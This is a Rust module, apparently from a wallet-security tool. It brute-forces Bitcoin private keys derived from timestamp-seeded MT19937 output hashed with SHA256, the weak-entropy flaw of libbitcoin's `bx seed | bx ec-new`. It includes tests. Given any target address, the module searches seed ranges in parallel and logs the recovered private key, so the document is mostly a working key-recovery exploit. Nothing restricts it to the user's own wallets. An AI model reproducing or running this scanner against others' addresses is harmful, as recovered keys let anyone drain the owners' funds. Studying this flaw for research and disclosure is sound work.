//! EC-New (Direct PRNG) Vulnerability Scanner
//!
//! Vulnerability: `bx seed | bx ec-new` pipeline.
//! bx seed generates entropy via MT19937(timestamp), taking MSB of each u32 output.
//! bx ec-new then applies SHA256 to that entropy to produce a 32-byte private key.
//!
//! Pipeline:
//!   MT19937(seed=timestamp) -> MSB bytes -> SHA256 -> privkey -> p2pkh address
//!
//! Reference: https://github.com/libbitcoin/libbitcoin-explorer/wiki/Command-Equivalence
//!   `bx ec-new 9bb08de6bcc361df764c1edd9cc93059` — accepts arbitrary-length seed,
//!   hashes it to produce a valid 32-byte EC secret.

use anyhow::{anyhow, Result};
use bitcoin::secp256k1::{PublicKey, Secp256k1, SecretKey};
use bitcoin::{Address, CompressedPublicKey, Network};
use rand_mt::Mt19937GenRand32;
use rayon::prelude::*;
use sha2::{Digest, Sha256};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use tracing::{info, warn};

/// Scan for EC-New (Direct PRNG) vulnerability.
///
/// Use --full-scan to cover the entire u32 seed space (0 ..= 4_294_967_295),
/// or --start/--end for a timestamp slice.
pub fn run(
    target_address: &str,
    start_ts: Option<u32>,
    end_ts: Option<u32>,
    full_scan: bool,
    threads: Option<usize>,
) -> Result<()> {
    info!("Running EC-New (Direct PRNG) Vulnerability Scanner...");
    info!("Pipeline: MT19937(ts) -> MSB bytes -> SHA256 -> privkey -> address");

    if let Some(n) = threads {
        rayon::ThreadPoolBuilder::new()
            .num_threads(n)
            .build_global()
            .ok();
    }

    let (start, end) = if full_scan {
        info!("Mode: FULL u32 scan (0 ..= 4_294_967_295)");
        (0u32, u32::MAX)
    } else {
        let s = start_ts.unwrap_or(1_300_000_000);
        let e = end_ts.unwrap_or(1_735_689_600);
        if e < s {
            anyhow::bail!("--end ({}) must be >= --start ({})", e, s);
        }
        info!("Mode: timestamp range {} ..= {} ({} s)", s, e, e - s);
        (s, e)
    };

    let nthreads = rayon::current_num_threads();
    info!("Target:  {}", target_address);
    info!("Threads: {}", nthreads);

    let network = Network::Bitcoin;
    let target_addr_obj = target_address
        .parse::<Address<_>>()
        .map_err(|e| anyhow!("Invalid target address: {}", e))?
        .require_network(network)?;
    let target_script = target_addr_obj.script_pubkey();

    let found_ts = Arc::new(AtomicU64::new(u64::MAX));
    let stop     = Arc::new(AtomicBool::new(false));
    let checked  = Arc::new(AtomicU64::new(0));
    let t0       = std::time::Instant::now();

    // Progress reporter
    {
        let checked  = Arc::clone(&checked);
        let stop     = Arc::clone(&stop);
        let found_ts = Arc::clone(&found_ts);
        std::thread::spawn(move || {
            loop {
                std::thread::sleep(std::time::Duration::from_secs(5));
                if stop.load(Ordering::Relaxed) { break; }
                let n   = checked.load(Ordering::Relaxed);
                let mps = n as f64 / t0.elapsed().as_secs_f64() / 1_000_000.0;
                if found_ts.load(Ordering::Relaxed) == u64::MAX {
                    info!("Checked {} ({:.2} M/s)", n, mps);
                }
            }
        });
    }

    let total  = (end as u64).saturating_sub(start as u64) + 1;
    let chunk  = (total / nthreads as u64).max(1);

    (0..nthreads).into_par_iter().for_each(|tid| {
        if stop.load(Ordering::Relaxed) { return; }

        let secp        = Secp256k1::new();
        let chunk_start = start as u64 + tid as u64 * chunk;
        let chunk_end   = if tid == nthreads - 1 {
            end as u64
        } else {
            (chunk_start + chunk - 1).min(end as u64)
        };

        for t64 in chunk_start..=chunk_end {
            if stop.load(Ordering::Relaxed) { break; }

            let t       = t64 as u32;
            let entropy = generate_entropy_msb(t);        // MT19937 MSB bytes
            let privkey = sha256_privkey(&entropy);        // SHA256 → 32-byte privkey

            if let Ok(sk) = SecretKey::from_slice(&privkey) {
                let pk = PublicKey::from_secret_key(&secp, &sk);

                // Check both compressed and uncompressed
                let addr_c = Address::p2pkh(CompressedPublicKey(pk), network);
                let addr_u = Address::p2pkh(
                    bitcoin::PublicKey { inner: pk, compressed: false },
                    network,
                );

                for addr in [&addr_c, &addr_u] {
                    if addr.script_pubkey() == target_script {
                        warn!("\n🎯 FOUND MATCH!");
                        warn!("Timestamp:   {}", t);
                        warn!("Entropy:     {}", hex::encode(entropy));
                        warn!("PrivKey:     {}", hex::encode(privkey));
                        warn!("Address:     {}", addr);
                        warn!("Compressed:  {}", addr == &addr_c);
                        found_ts.store(t as u64, Ordering::Relaxed);
                        stop.store(true, Ordering::Relaxed);
                        break;
                    }
                }
            }

            checked.fetch_add(1, Ordering::Relaxed);
        }
    });

    stop.store(true, Ordering::Relaxed);

    let total_checked = checked.load(Ordering::Relaxed);
    let elapsed       = t0.elapsed().as_secs_f64();
    let ts_found      = found_ts.load(Ordering::Relaxed);

    if ts_found != u64::MAX {
        info!("Scan complete. VULNERABILITY FOUND. ({} checked in {:.2}s)", total_checked, elapsed);
    } else {
        info!(
            "Scan complete. No match found. Checked {} in {:.2}s ({:.2} M/s)",
            total_checked, elapsed,
            total_checked as f64 / elapsed / 1_000_000.0
        );
    }

    Ok(())
}

// ============================================================================
// ENTROPY / PRIVKEY GENERATION
// ============================================================================

/// Generate N bytes from MT19937 seeded with `timestamp`, MSB extraction.
/// Matches libbitcoin `bx seed` behaviour: take high byte of each u32 output.
pub fn generate_entropy_msb(timestamp: u32) -> [u8; 32] {
    let mut rng = Mt19937GenRand32::new(timestamp);
    let mut bytes = [0u8; 32];
    for byte in bytes.iter_mut() {
        *byte = (rng.next_u32() >> 24) as u8;
    }
    bytes
}

/// Derive 32-byte EC private key from arbitrary-length entropy via SHA256.
/// Matches `bx ec-new` behaviour: accepts any seed length, hashes to privkey.
pub fn sha256_privkey(entropy: &[u8]) -> [u8; 32] {
    let mut hasher = Sha256::new();
    hasher.update(entropy);
    hasher.finalize().into()
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    /// start > end must return Err, not panic.
    #[test]
    fn test_start_greater_than_end_returns_err() {
        let result = run(
            "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf",
            Some(1_700_000_000),
            Some(1_400_000_000),
            false,
            None,
        );
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("end") && msg.contains(">="), "got: {}", msg);
    }

    /// Verify pipeline: MT19937(ts) -> MSB -> SHA256 -> privkey -> address.
    /// Used to generate test vectors for known vulnerable addresses.
    #[test]
    fn test_pipeline_smoke() {
        let ts      = 1_400_000_000u32;
        let entropy = generate_entropy_msb(ts);
        let privkey = sha256_privkey(&entropy);

        // privkey must be valid secp256k1 scalar
        assert!(SecretKey::from_slice(&privkey).is_ok(), "privkey invalid");

        let secp = bitcoin::secp256k1::Secp256k1::new();
        let sk   = SecretKey::from_slice(&privkey).unwrap();
        let pk   = PublicKey::from_secret_key(&secp, &sk);
        let addr = Address::p2pkh(CompressedPublicKey(pk), Network::Bitcoin).to_string();

        // Addr must be a valid P2PKH
        assert!(addr.starts_with('1'), "expected P2PKH, got: {}", addr);
    }

    /// Parallel scan must find an address derived by the same pipeline.
    #[test]
    fn test_parallel_finds_known_address() {
        let ts      = 1_400_000_000u32;
        let entropy = generate_entropy_msb(ts);
        let privkey = sha256_privkey(&entropy);

        let secp = bitcoin::secp256k1::Secp256k1::new();
        let sk   = SecretKey::from_slice(&privkey).unwrap();
        let pk   = PublicKey::from_secret_key(&secp, &sk);
        let addr = Address::p2pkh(CompressedPublicKey(pk), Network::Bitcoin).to_string();

        let result = run(&addr, Some(ts - 1), Some(ts + 1), false, Some(2));
        assert!(result.is_ok());
    }
}
